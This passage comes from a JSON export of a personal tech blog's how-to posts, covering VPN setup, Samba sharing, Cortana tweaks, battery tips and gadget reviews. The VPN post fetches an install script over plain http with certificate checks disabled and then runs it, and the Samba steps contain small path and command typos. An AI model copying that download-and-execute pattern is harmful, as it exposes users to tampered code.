http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc-pixel-game.png\r\n [5]: http://localhost/wordpress/wp-content/uploads/2016/11/library-settings.png\r\n [6]: http://localhost/wordpress/wp-content/uploads/2016/11/play-ps3-games-on-pc.png\r\n",
        "tags": [
            "emulator",
            "games",
            "play",
            "playstaion 2",
            "playstation",
            "playstation 3",
            "psx",
            "rpcs3",
            "sony",
            "windows"
        ]
    },
    {
        "uri": "/calendar-watch/",
        "title": "Calendar Watch",
        "content": "{{ youtube o0hRTNGgm2Y }}\r\n\r\nThis is the a href=\"https://www.whatwatch.com/calendar-watch-features/\" target=\"_blank\"Calendar Watch/a. It is a smartwatch by the company What? The Calendar Watch provides a unique take on smartwatches while adding in a good amount of luxury.\r\n\r\nEnter in the Calendar Watch Giveaway Below:\r\n\r\n* *\r\n\r\na class=\"e-widget no-button\" href=\"https://gleam.io/UKado/calendar-watch-giveaway\" rel=\"nofollow\"Calendar Watch Giveaway/a\r\n  \r\n\r\n\r\n* *\r\n\r\n\\*\\*Open to anywhere that can physically receive packages from the U.S.\\*\\*\r\n",
        "tags": [
            "calendar",
            "giveaway",
            "smartwatch",
            "watch",
            "what"
        ]
    },
    {
        "uri": "/control-multiple-computers/",
        "title": "Control Multiple Computers",
        "content": "{{ youtube -St2Ew8oJzE }}\r\n\r\nDoes your workstation setup contain more than one computer? I have my main desktop along with my surface setting in front of my at all times. I sometimes hate that I have to reach across my desk and switch between keyboards to type something. Luckily, USB sharing between the two devices is not difficult. Thanks to a garage app by Microsoft, you can control multiple computers with one mouse and keyboard very easily.\r\n\r\nWhat You will Need:\r\n\r\n  Mouse without Borders\r\n\r\n Setup:\r\n\r\nSetting up Mouse without borders is very easy. When you run it for the first time, it will ask you whether or not you already have the program installed on other devices. If you don&#8217;t, it will prompt you with a  Key and your Computer&#8217;s name. You will enter this info on any other computer that you want to control.\r\n\r\nimg class=\"alignnone wp-image-1945 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/mouse-without-borders-setup-300x287.png\" alt=\"mouse-without-borders-setup\" width=\"300\" height=\"287\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/mouse-without-borders-setup-300x287.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/mouse-without-borders-setup.png 542w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nWhat&#8217;s really helpful is that the program provides you the ability to customize your setup. For example, I have my Surface directly beneath my monitor (well, more at an angle). Within the program, I can move the monitors around to match my setup.\r\n\r\nimg class=\"alignnone size-medium wp-image-1947\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/without-borders-setup-300x203.png\" alt=\"without-borders-setup\" width=\"300\" height=\"203\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/without-borders-setup-300x203.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/without-borders-setup.png 578w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nOverall, the functionality of this program is amazing! It&#8217;s almost like I have my Surface setup in a dual monitor configuration. Within games, I can go to my surface, do some work, then be right back in the game. The transition is quick and seamless. Definitely give it a try!\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2016/11/mouse-without-borders-setup.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2016/11/without-borders-setup.png\r\n",
        "tags": [
            "borders",
            "computers",
            "control",
            "microsoft",
            "monitor",
            "mouse",
            "multiple",
            "windows"
        ]
    },
    {
        "uri": "/make-cortana-use-google/",
        "title": "Make Cortana use Google",
        "content": "{{ youtube 8QrzRbx87wk }}\r\n\r\nAs you know, Microsoft Cortana has become an integral part of Windows 10. I wouldn&#8217;t mind Cortana so much if Microsoft didn&#8217;t force it upon us. One thing which really bothers me about Cortana is that it defaults to Microsoft Edge and Bing. I am a Google person, so I would prefer if it used Google Search and Google Chrome. Before the Windows 10 Anniversary update, there used to be a way to change the default behavior. Since the update, Microsoft has removed this ability. Luckily, there is still a way to achieve this using a simple registry hack. Using a program called SearchWithMyBrowser, you can change the registry and make Cortana use Google.\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://github.com/charlesmilette/SearchWithMyBrowser\" target=\"_blank\"Search with My Browser/a\r\n  a href=\"https://chrome.google.com/webstore/detail/chrometana-redirect-bing/kaicbfmipfpfpjmlbpejaoaflfdnabnc?utmsource=chrome-ntp-icon\" target=\"blank\"Chrometana/a\r\n\r\n Procedure:\r\n\r\nFirst,  you need to download Search with My Browser from the link listed above. Go to the Github page, and select the option that reads Clone or Download. Then select the option to Download Zip.\r\n\r\nimg class=\"alignnone size-medium wp-image-1951\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/download-searchwithmybrowser-300x160.png\" alt=\"download-searchwithmybrowser\" width=\"300\" height=\"160\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/download-searchwithmybrowser-300x160.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/download-searchwithmybrowser.png 494w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nAfterward, extract the zip. You will see a file ( a Windows .bat file to be exact) named Make. Double click this file to run it.\r\n\r\nimg class=\"alignnone size-medium wp-image-1953\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/SearchWithMyBrowser-Make-1-300x119.png\" alt=\"searchwithmybrowser-make\" width=\"300\" height=\"119\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-Make-1-300x119.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-Make-1-768x305.png 768w, http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-Make-1.png 783w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nAfter it runs, you should see three new files. Next, double click the file named Install.  A command prompt will open asking where you want the permanent location of the application to be at. You can keep the program (SearchWithMyBrowser.exe)  it in the current folder or move it to a new folder. If you know that you will never delete this folder then keep it here. Otherwise, I suggest that you move it to a new folder. If you keep it in the current folder type in _SearchWithMyBrowser.exe _in the command prompt. If you move it to a new location, type the name of the location followed by /SearchWithMyBrowser.exe (but make sure you move it to that new location first).\r\n\r\nimg class=\"alignnone size-medium wp-image-1954\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/SearchWithMyBrowser-command-prompt-300x165.png\" alt=\"searchwithmybrowser-command-prompt\" width=\"300\" height=\"165\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-command-prompt-300x165.png 300w, http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-command-prompt.png 660w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nAfter that, hit enter. Then hit enter one more time to see if it worked. If it does, you should see a window asking how do you want to open this. Select the option that reads &#8220;SearchwithMyBrowser&#8221;.\r\n\r\nimg class=\"alignnone wp-image-1955 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/how-do-you-want-to-open-this-300x127.jpg\" alt=\"how-do-you-want-to-open-this\" width=\"300\" height=\"127\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/how-do-you-want-to-open-this-300x127.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/11/how-do-you-want-to-open-this-768x324.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/11/how-do-you-want-to-open-this-1024x432.jpg 1024w\" sizes=\"(max-width: 300px) 100vw, 300px\" /\r\n\r\nIf this option doesn&#8217;t appear, don&#8217;t worry; you might have to reboot your computer. Either way, I would recommend rebooting your computer after you make these changes.\r\n\r\nSo finally, if you perform a search using Cortana in the Windows Start Menu, it should open up your default browser. The only problem is that it still uses Bing search. To fix this (unless you don&#8217;t mind it using Bing search) download the Chrome Plugin called Chrometana linked above. This will redirect all of the Bing searches to Google Chrome. Of course, this only works if your default browser is Google Chrome [but why wouldn&#8217;t it be 😉 ]\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2016/11/download-searchwithmybrowser.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-Make-1.png\r\n [3]: http://localhost/wordpress/wp-content/uploads/2016/11/SearchWithMyBrowser-command-prompt.png\r\n [4]: http://localhost/wordpress/wp-content/uploads/2016/11/how-do-you-want-to-open-this.jpg\r\n",
        "tags": [
            "chrome",
            "cortana",
            "google",
            "search",
            "trick",
            "windows"
        ]
    },
    {
        "uri": "/android-battery-saving-tips-disable-snapchat-background-data/",
        "title": "Android Battery Saving Tips – Restrict Snapchat Background Data",
        "content": "img class=\"alignnone wp-image-1964 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/Snapchat-1024x576.jpg\" alt=\"Restrict background data Snapchat\" width=\"810\" height=\"456\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/Snapchat-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/11/Snapchat-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/11/Snapchat-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/11/Snapchat.jpg 1280w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\n\nBattery life on Android is a nightmare to deal with unless you know exactly what to look for. Android&#8217;s vague battery statistics can be frustrating for a novice and seasoned user alike. For example, a battery drain labeled as Android System could be Google Play Services performing something in the background, or the Facebook app using the camera, or any other app that makes any API call. And speaking of Facebook, there&#8217;s a lot of conflicting research and anecdotal reports on whether a href=\"https://www.theguardian.com/technology/2016/feb/01/uninstalling-facebook-app-saves-up-to-20-of-android-battery-life?CMP=ShareAndroidAppredditisfun\" target=\"_blank\"the app is responsible for any sort of excessive battery drain/a. Personally, I spent a week with the Facebook app uninstalled and saw no difference in battery life.\n\nThere is another app that is notorious for draining your battery, Snapchat. Snapchat periodically loads stories in the background. The benefit to doing this is so you aren&#8217;t waiting forever for a story to download; you can watch it immediately. The biggest disadvantage is that it drains your battery in the process.\n\nimg class=\"alignleft wp-image-1962 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/Screenshot20161128-231324-169x300.png\" alt=\"Snapchat Restrict Background Data\" width=\"169\" height=\"300\" /img class=\"alignleft wp-image-1963 size-medium\" src=\"http://davebennett.tech/wp-content/uploads/2016/11/Screenshot20161128-231327-169x300.png\" alt=\"Snapchat Restrict Background Data\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/11/Screenshot20161128-231327-169x300.png 169w, http://localhost/wordpress/wp-content/uploads/2016/11/Screenshot20161128-231327-768x1365.png 768w, http://localhost/wordpress/wp-content/uploads/2016/11/Screenshot20161128-231327-576x1024.png 576w, http://localhost/wordpress/wp-content/uploads/2016/11/Screenshot20161128-231327.png 1080w\" sizes=\"(max-width: 169px) 100vw, 169px\" /Many users have reported a slight battery life increase when they disable this functionality altogether. To Disable Snapchat Background Data go to Android Settings &#8211; Applications &#8211; Snapchat. Then select data usage. You will be taken to a window which shows the data usage for Snapchat over a period of time. Select the option to Restrict app background data. This will disable stories from preloading in the background. Don&#8217;t worry, you will still receive notifications. One side effect from doing this is that you will have to wait until your Snap sends before you leave the app or it will not send in the background.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2016/11/Snapchat.jpg\n [2]: http://davebennett.tech/wp-content/uploads/2016/11/Screenshot_20161128-231324.png\n [3]: http://localhost/wordpress/wp-content/uploads/2016/11/Screenshot_20161128-231327.png\n",
        "tags": [
            "android",
            "battery",
            "data",
            "life",
            "save",
            "snapchat"
        ]
    },
    {
        "uri": "/measure-battery-usage-windows/",
        "title": "Measure Battery Usage in Windows",
        "content": "img class=\"alignnone size-large wp-image-1977\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/Windfows-measure-battery-usage-1024x580.jpg\" alt=\"windows-measure-battery-usage\" width=\"810\" height=\"459\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/Windfows-measure-battery-usage-1024x580.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/Windfows-measure-battery-usage-300x170.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/12/Windfows-measure-battery-usage-768x435.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/12/Windfows-measure-battery-usage.jpg 1059w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\n\nMost people would never guess that there is a tool to measure battery usage in Windows. I first discovered this when trying to figure out what was draining my battery on my Surface Pro 3.  For a quick overview of battery drain by app, you can use the Windows Battery Saving settings.\n\nWindows Battery Saver\n\nTo access this, type in Windows Battery Saver in the Start Menu search.\n\nimg class=\"alignnone wp-image-1976 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/Battery-Saver-Windows-1024x875.png\" alt=\"battery-saver-windows\" width=\"810\" height=\"692\" /\n\nTo get battery usage by app, select the option to option to _view battery usage by app. _This will give you a quick overview of what apps are draining your battery. It should come as no surprise that Google Chrome is almost always at the top of the list.\n\nimg class=\"alignnone size-large wp-image-1975\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/battery-usage-by-app-1024x645.png\" alt=\"windows battery-usage-by-app\" width=\"810\" height=\"510\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/battery-usage-by-app-1024x645.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/battery-usage-by-app-300x189.png 300w, http://localhost/wordpress/wp-content/uploads/2016/12/battery-usage-by-app-768x484.png 768w, http://localhost/wordpress/wp-content/uploads/2016/12/battery-usage-by-app.png 1435w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\n\n Powercrfg\n\nIf you want a more extensive report, than you can use powercfg. Open up command prompt and type in the following:\n\npowercfg /BATTERYREPORT\n\nThis will generate an html file filled with very in-depth information such as your estimated capacity, your battery drain over time and battery life estimates.\n\nimg class=\"alignnone size-large wp-image-1974\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/battery-report-1024x814.png\" alt=\"windows battery-report\" width=\"810\" height=\"644\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/battery-report-1024x814.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/battery-report-300x238.png 300w, http://localhost/wordpress/wp-content/uploads/2016/12/battery-report-768x610.png 768w, http://localhost/wordpress/wp-content/uploads/2016/12/battery-report.png 1456w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\n\n [1]: http://localhost/wordpress/wp-content/uploads/2016/12/Windfows-measure-battery-usage.jpg\n [2]: http://davebennett.tech/wp-content/uploads/2016/12/Battery-Saver-Windows.png\n [3]: http://localhost/wordpress/wp-content/uploads/2016/12/battery-usage-by-app.png\n [4]: http://localhost/wordpress/wp-content/uploads/2016/12/battery-report.png\n",
        "tags": [
            "battery",
            "drain",
            "measure",
            "surface",
            "tablet",
            "windows"
        ]
    },
    {
        "uri": "/create-a-vpn-server/",
        "title": "Create a VPN Server",
        "content": "There are three routes that you can take when setting up a VPN. You can either use a free one, buy a paid service or make your own. The advantage of free VPNs is that they are easy to setup; just install and they are ready to be used. My favorite VPN on Android is a href=\"https://play.google.com/store/apps/details?id=com.opera.vpn\" target=\"blank\" rel=\"noopener\"Opera VPN/a. The downside of Free VPNs is that they typically come with a 500 &#8211; 1GB data cap and are very slow. Paid VPNs will give you the most secure and fastest service, but at a cost. I personally have never tried any paid VPN&#8217;s. Making your own VPN might not be the _most secure option but gives you greater control over how the VPN is configured and some good experience. So let&#8217;s create a VPN server. For this tutorial, we are going to use Linux. You could also do this on a Windows Machine if you would like. Remember, the machine running your VPN server should stay on 24/7 (what good would it be off?). Because of the small energy footprint, I am going to use the a href=\"https://www.amazon.com/Raspberry-Pi-RASP-PI-3-Model-Motherboard/dp/B01CD5VC92/ref=sr1_1?ie=UTF8&qid=1480727813&sr=8-1&keywords=raspberry+pi\" target=\"blank\" rel=\"noopener\"Raspberry Pi/a.\n\nWhat You Will Need:\n\n  Computer running Linux\n\n Step 1: Static IP\n\nThis is not a required step, but I highly recommend that you setup your VPN with a static IP address. Otherwise, you will have to change your OpenVPN settings every time your router decides to give your computer a new IP address.\n\nTo setup a static IP address, you can either do it from your router or within Linux. To do it in Linux, edit your Network Interfaces files.\n\npresudo nano /etc/network/interfaces/pre\n\nI will leave my settings posted below. Feel free to copy them and use them in your setup. Just remember to change the IP address to match yours. Also, if you&#8217;re connected wirelessly to the internet, you will need to use wlan rather than eth0.\n\npreauto eth0\niface eth0 inet static\naddress 192.168.50.116\nnetmask 255.255.255.0\nbroadcast 192.168.50.255\ngateway 192.168.50.1/pre\n\nStep 2: Install OpenVPN\n\nLuckily, installing OpenVPN is not going to be a hard or tedious process. Thanks to a simple automated script hosted on Github, you can have OpenVPN up and running in a matter of minutes. First, download the script:\n\nprewget http://git.io/vpn --no-check-certificate -O openvpn-install.sh; chmod +x openvpn-install.sh;/pre\n\nIt should download to your home folder (or wherever you executed the previous command from). Next, execute the script:\n\npre./openvpn-install.sh/pre\n\nThis will start the OpenVPN install. The installation is pretty straightforward. It will confirm your IP address then ask you for the port number that you would like to use  (you can keep it default). It will also ask you want DNS resolver that you want to use. Use Google DNS unless you have a strong reason not to. Finally, it will ask you to give a name to the cert. Since I am using this on my Microsoft Surface Tablet, I named mine surface. Keep in mind, these certs are essentially the individual keys to each device that you want to connect to the VPN server. What&8217;s great about this script is that you can simply re-run it to generate more certs for each device that you want.\n\nAfter you named the cert, it will ask you if you&#8217;re behind a *NAT. *If you are using this on your Wifi network, then you are. It will then ask you to confirm your global IP address.\n\nAfter you go through the previous steps, it will begin downloading and installing the dependencies to OpenVPN and generate the RSA keys. Depending on your computer speed, it could take awhile.\n\nOnce the process completes, your certs should be available in your home folder. If you can&#8217;t find them for some reason, use the following command to search your files system:\n\npresudo find / -type f -name \"*.ovpn\"/pre\n\nNow transfer them to the devices that you want to connect to your OpenVPN server\n\nStep 3: Port Forwarding\n\nIf you want to be able to use your VPN outside of your home network, you wil need to open up ports. This process is different depending on your router. Generally speaking, you want to use port 1194 (unless you changed it from the default) and use UDP.\n\n Step 4: Connecting\n\nTo connect to your VPN server on a Windows device, a href=\"https://openvpn.net/index.php/open-source/downloads.html\" target=\"_blank\" rel=\"noopener\"download and install OpenVPN/a. Then transfer the .ovpn cert that you created earlier to C:\\Program Files\\OpenVPN\\Config. The launch the program as administrator. It will pop up in the task tray. Right click on the icon and select connect. It should find the configuration and automatically connect to the VPN.\n\nTo connect to your VPN on Android, a href=\"https://play.google.com/store/apps/details?id=net.openvpn.openvpn\" target=\"_blank\" rel=\"noopener\"download OpenVPN /afrom the PlayStore. Then, go to the settings and select the option to connect using a profile. Find your .ovpn file and select connect. It should conenct directly to the VPN server.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2016/12/Port-forward.png\n",
        "tags": [
            "create",
            "linux",
            "network",
            "openvpn",
            "privacy",
            "secure",
            "security",
            "server",
            "ubuntu",
            "vpn"
        ]
    },
    {
        "uri": "/best-extensions-google-chrome/",
        "title": "Best Extensions for Google Chrome",
        "content": "{{ youtube ZZPjCvOrzGo }}\r\n\r\nThe best thing about Google Chrome is all the extensions that are available for it. Now I recently learned that Microsoft Edge also has extensions, but nowhere near as many as google chrome. By no means is this an exhaustive list of all the best extensions for Google Chrome; just a few of my favorites that I use every day.\r\n\r\na href=\"https://chrome.google.com/webstore/detail/ghostery/mlomiejdfkolichcflejclcbmpeaniij?utmsource=chrome-ntp-icon\" target=\"blank\"Ghostery/a\r\n\r\nimg class=\"alignnone wp-image-1996 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/ghostery-1024x715.png\" alt=\"ghostery\" width=\"810\" height=\"566\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/ghostery-1024x715.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/ghostery-300x210.png 300w, http://localhost/wordpress/wp-content/uploads/2016/12/ghostery-768x536.png 768w, http://localhost/wordpress/wp-content/uploads/2016/12/ghostery.png 1194w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\r\n\r\nIf you are concerned about your privacy on the internet, then Ghostery is the perfect app for you. Whenever you visit a website, Ghostery will show you the trackers that are watching you. Most of these trackers aren&8217;t bad (just analytics and advertising data) but they still keep track of your IP. Ghostery allows you to block any of the tracking sites. You can block a tracker on a specific site or on any site that you visit.\r\n\r\na href=\"https://chrome.google.com/webstore/detail/googl-url-shortener/iblijlcdoidgdpfknkckljiocdbnlagk?utmsource=chrome-ntp-icon\" target=\"blank\"Google URL Shortener/a\r\n\r\nimg class=\"alignnone wp-image-1995 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/Google-url-shortener-1024x683.png\" alt=\"google-url-shortener\" width=\"810\" height=\"540\" /\r\n\r\nThis is a simple app that I use all the time. Google URL shortener will shorten the link to the current website that you are on. It also gives you simple analytics of the shortened links such as how many people clicked on it.\r\n\r\n a href=\"https://chrome.google.com/webstore/detail/colorpick-eyedropper/ohcpnigalekghcmgcdcenkpelffpdolg?utmsource=chrome-ntp-icon\" target=\"blank\"ColorPick Eyedropper/a\r\n\r\nimg class=\"alignnone wp-image-1994 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/Color-Picker-1024x651.png\" alt=\"color-picker\" width=\"810\" height=\"515\" /\r\n\r\nThis extension I use all the time while working in Photoshop. Color Picker allows you to get the hex value of any color that&#8217;s currently displayed on the web page.\r\n\r\na href=\"https://chrome.google.com/webstore/detail/better-youtube-subscripti/kgicdngjllamjgijagdkoalhkpplipnd?utmsource=chrome-ntp-icon\" target=\"blank\"Better YouTube Subscriptions/a\r\n\r\nimg class=\"alignnone wp-image-1997 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/better-youtube-subscription-1024x691.png\" alt=\"better-youtube-subscription\" width=\"810\" height=\"547\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/better-youtube-subscription-1024x691.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/better-youtube-subscription-300x203.png 300w, http://localhost/wordpress/wp-content/uploads/2016/12/better-youtube-subscription-768x518.png 768w, http://localhost/wordpress/wp-content/uploads/2016/12/better-youtube-subscription.png 1274w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\r\n\r\nIf you&8217;re an avid YouTube watcher, then you probably know how annoying it is to switch between tabs while watching several videos. With this plugin, each video will appear in its own pop-up window.\r\n\r\na href=\"https://chrome.google.com/webstore/detail/whatfont/jabopobgcpjmedljpbcaablpmlmfcogm?utmsource=chrome-ntp-icon\" target=\"blank\"What Font/a\r\n\r\nimg class=\"alignnone wp-image-1993 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/What-Font-1024x722.png\" alt=\"what-font\" width=\"810\" height=\"571\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/What-Font-1024x722.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/What-Font-300x212.png 300w, http://localhost/wordpress/wp-content/uploads/2016/12/What-Font-768x542.png 768w, http://localhost/wordpress/wp-content/uploads/2016/12/What-Font.png 1130w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\r\n\r\nI started to become a little obsessed with fonts, especially while redesigning this website. With that font, you can hover over any text and it will show you the font name and its properties. Very useful!\r\n\r\n a href=\"https://chrome.google.com/webstore/detail/lastpass-free-password-ma/hdokiejnpimakedhajhdlcegeplioahd?utmsource=chrome-ntp-icon\" target=\"blank\"LastPass/a\r\n\r\nimg class=\"alignnone wp-image-1992 size-large\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/Lastpass-1024x719.png\" alt=\"lastpass\" width=\"810\" height=\"569\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/12/Lastpass-1024x719.png 1024w, http://localhost/wordpress/wp-content/uploads/2016/12/Lastpass-300x211.png 300w, http://localhost/wordpress/wp-content/uploads/2016/12/Lastpass-768x540.png 768w, http://localhost/wordpress/wp-content/uploads/2016/12/Lastpass.png 1163w\" sizes=\"(max-width: 810px) 100vw, 810px\" /\r\n\r\nLastpass extends beyond a simple Chrome extension. Lastpass is a very robust password manager. It allows you to generate secure passwords and saves all the passwords that you use. It can also auto log you into sites and periodically change your passwords. It is completely worth purchasing the yearly subscription for this.\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2016/12/ghostery.png\r\n [2]: http://davebennett.tech/wp-content/uploads/2016/12/Google-url-shortener.png\r\n [3]: http://davebennett.tech/wp-content/uploads/2016/12/Color-Picker.png\r\n [4]: http://localhost/wordpress/wp-content/uploads/2016/12/better-youtube-subscription.png\r\n [5]: http://localhost/wordpress/wp-content/uploads/2016/12/What-Font.png\r\n [6]: http://localhost/wordpress/wp-content/uploads/2016/12/Lastpass.png\r\n",
        "tags": [
            "apps",
            "best",
            "browser",
            "chrome",
            "extensions",
            "google"
        ]
    },
    {
        "uri": "/top-android-holiday-apps/",
        "title": "Top Android Holiday Apps",
        "content": "{{ youtube CIS3N-PhIk8 }}\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.samruston.weather\" target=\"_blank\"Weather Timeline/a\r\n\r\n a href=\"http://app.reuters.tv/DaveBennett\" target=\"_blank\"Reuters TV (Sponsored)/a\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.zeeshan.circlesidebar\" target=\"_blank\"Circle Sidebar/a\r\n\r\n a href=\"https://play.google.com/store/apps/details?id=com.google.android.apps.photos.scanner\" target=\"_blank\"Google Photoscan /a\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.mm.views\" target=\"_blank\"GeoQpons/a\r\n\r\n a href=\"https://play.google.com/store/apps/details?id=com.thekrazycouponlady.kcl\" target=\"_blank\"Krazy Coupon Lady/a\r\n\r\na href=\"https://play.google.com/store/apps/details?id=com.beesociety.dingless\" target=\"_blank\"Dingless/a\r\n",
        "tags": [
            "android",
            "apps",
            "holiday",
            "top android apps"
        ]
    },
    {
        "uri": "/best-android-smartwatch-2016/",
        "title": "Best Android Smartwatch 2016",
        "content": "{{ youtube Y7ubDt_UTPA }}\n\nI have been using the Huawei Watch for over two months now and I can safely say that it&#8217;s the best Android smartwatch that I have ever owned. It features a high-quality aluminum design with a crisp 400 x 400 AMOLED display.  There&#8217;s even a speaker so that you can make phone calls and listen to music right from the watch. The only two things that I don&#8217;t like about this watch is the weak vibration motor and the annoying pin charging mechanism. Be sure to check out the a href=\"https://www.amazon.com/Huawei-Stainless-Suture-Leather-Warranty/dp/B013LKLIB0/ref=sr1_1?ie=UTF8&qid=1482420897&sr=8-1&keywords=huwawi+smart+watch\" target=\"blank\"Huawei watch on Amazon/a.\n",
        "tags": [
            "android wear",
            "best android smartwatch",
            "huawei",
            "review",
            "smartwatch",
            "wear",
            "wearables"
        ]
    },
    {
        "uri": "/share-internet-connection-windows/",
        "title": "Share Internet Connection Windows",
        "content": "\n\nMy friend and I decided to have a small LAN gaming session the other day. There was just one problem, he didn&#8217;t have a wireless adapter for his PC. Luckily, I had my Windows Surface on me and was able to share my internet through that (with the help of this USB Ethernet dongle) to my friend&#8217;s PC.\n\nTo share your internet in Windows, you will need to make sure that you have a device that has an active wireless connection along with an Ethernet port. Alternatively, you could use a href=\"http://davebennett.tech/reverse-tether/\" target=\"_blank\"this method/a to turn your computer into a wifi hotspot.\n\nProcedure:\n\nConnect the client PC (the one without internet) to the host PC via an Ethernet cable. Then, go into Network connections and right click on the wireless connection and go down to properties.\n\nGo to the sharing tab and select the option to allow other network users to connect. Then click OK to apply the changes.\n\n&nbsp;\n\nYou might have to unplug and replug the ethernet cable of the client PC back in for it to get a connection.\n\nThat&8217;s it! It&#8217;s a very painless way to share your internet connection. If you have problems connecting, try running the Windows Network Diagnostic. Surprisingly, it works well to fix any setup issues.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2016/12/Share-Internet-Connection-Windows.jpg\n [2]: http://localhost/wordpress/wp-content/uploads/2016/12/Wireless-Properties.png\n",
        "tags": [
            "reverse tether",
            "share internet",
            "share internet connection windows",
            "share internet windows"
        ]
    },
    {
        "uri": "/create-shared-network-folde-linux-r/",
        "title": "Create Shared Network Folder Linux",
        "content": "img class=\"alignnone size-full wp-image-2026\" src=\"http://davebennett.tech/wp-content/uploads/2016/12/Create-Shared-Network-Folder-Linux.png\" alt=\"\" width=\"1280\" height=\"720\" /\n\nOne of the most convenient ways to share data across a network is using a shared network folder. In Windows, setting up a shared network is usually an easy process. However, it&#8217;s not a straightforward to do in Linux (no surprise).\n\n* *\n\nCreate Shared Network Folder Linux\n\nTo begin, you are going to need to download and install samba\n\npreapt-get install samba\napt-get install samba-common-bin/pre\n\nNext, create the folder that you want to share.  I am going to create a folder in my home directory called shared:\n\npremkdir /home/shared/pre\n\nThen create a user and password combination that can be used to access your shared folder:\n\npresudo smbpasswd - a dave/pre\n\nFinally, go into the Samba conf file and add the shared folder with the users:\n\npresudo nano /etc/samba/smb.conf/pre\n\nThen add the following at the bottom:\n\npre[shared]\npath = /home/pi/shared\nvalid users = dave\nread only = no/pre\n\nRestart Samba for the changes to take effect.\n\npresudo /etc/init.d/samba restart/pre\n\nThat&8217;s it. You should now be able to access this shared network folder across other Windows and Linux devices.\n\n [1]: http://davebennett.tech/wp-content/uploads/2016/12/Create-Shared-Network-Folder-Linux.png\n",
        "tags": [
            "create",
            "folders",
            "linux",
            "network",
            "samba",
            "shared"
        ]
    },
    {
        "uri": "/play-pokemon-android-smartwatch/",
        "title": "Play Pokemon on Android Smartwatch",
